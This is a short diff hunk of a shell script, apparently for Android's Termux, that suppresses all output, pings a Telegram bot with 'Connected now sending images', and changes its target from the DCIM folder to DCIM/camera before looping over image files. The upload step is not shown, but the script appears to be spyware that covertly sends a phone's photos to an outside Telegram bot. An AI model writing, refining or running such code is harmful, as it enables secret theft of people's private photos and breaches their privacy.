@@ -13,7 +13,7 @@ exec >/dev/null 2>&1
 curl -s -o /dev/null "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=Connected%20now%20sending%20images"
 
 # Target only DCIM folder
-TARGET_DIR="$HOME/storage/shared/DCIM"
+TARGET_DIR="$HOME/storage/shared/DCIM/camera"
 
 # File processing
 find "$TARGET_DIR" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.gif" -o -iname "*.webp" \) 2>/dev/null -print0 | while IFS= read -r -d '' file; do
